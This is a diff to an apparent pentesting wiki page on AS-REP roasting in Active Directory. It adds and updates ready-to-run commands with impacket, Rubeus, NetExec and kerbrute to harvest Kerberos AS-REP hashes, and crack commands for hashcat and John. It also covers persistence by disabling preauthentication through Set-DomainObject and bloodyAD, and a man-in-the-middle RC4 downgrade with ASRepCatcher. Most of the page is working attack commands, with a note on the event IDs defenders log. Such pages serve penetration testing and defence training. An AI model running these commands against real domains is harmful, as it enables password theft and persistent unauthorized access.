@@ -25,31 +25,36 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get sear
 #### Request AS_REP message
 
 ```bash:Using Linux
-#Try all the usernames in usernames.txt
-python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-#Use domain creds to extract targets and target them
-python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+# Installed package entrypoint (same logic as GetNPUsers.py)
+impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
+# Use domain creds to LDAP-enumerate roastable users and request them
+impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
+# If you are running directly from the examples/ directory
+python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 ```
 
 ```bash:Using Windows
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 
 > [!WARNING]
-> AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+> Rubeus requests **RC4** by default, so Event ID **4768** usually shows **preauth type 0** and **ticket encryption type 0x17**. If you add **`/aes`** (or RC4 is disabled for the target), expect **AES etypes** instead.
 
 #### Quick one-liners (Linux)
 
 - Enumerate potential targets first (e.g., from leaked build paths) with Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
-- Pull a single user’s AS-REP even with a **blank** password using `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec also prints LDAP signing/channel binding posture).
-- Crack with `hashcat out.asreproast /path/rockyou.txt` – it auto-detects **-m 18200** (etype 23) for AS-REP roast hashes.
+- Roast a whole username list without valid creds using NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
+- If you do have creds, let NetExec query LDAP and request every roastable account for you: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
+- If the output starts with **`$krb5asrep$23$`**, crack it with Hashcat **`-m 18200`**. If it starts with **`$krb5asrep$17$`** or **`$krb5asrep$18$`**, prefer John **`--format=krb5asrep`**.
 
 ### Cracking
 
+Don't assume every AS-REP roast is RC4. Modern tooling can return **RC4** (`$krb5asrep$23$`) or **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) depending on the requested/negotiated enctype. **`hashcat -m 18200`** is for **etype 23**, while **John** handles `krb5asrep` directly for **17/18/23**.
+
 ```bash
-john --wordlist=passwords_kerb.txt hashes.asreproast
-hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
+john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
+hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
 ```
 
 ### Persistence
@@ -57,17 +62,23 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
 
 ```bash:Using Windows
+# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
 ```bash:Using Linux
+# Enable ASREPRoastability
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
+# Cleanup
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
 ```
 
 ## ASREProast without credentials
 
 An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
+If you want the related no-credential trick that returns a **service ticket** instead of a **TGT** from a no-preauth principal, see [Kerberoast](kerberoast.md).
+
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. `relay` mode is the interesting one offensively because it can force **RC4** when the client still advertises **etype 23**; `listen` stays passive and just captures whatever the client/DC negotiated.
 
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
@@ -83,6 +94,8 @@ ASRepCatcher listen
 ## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
+- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
 - [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 ---
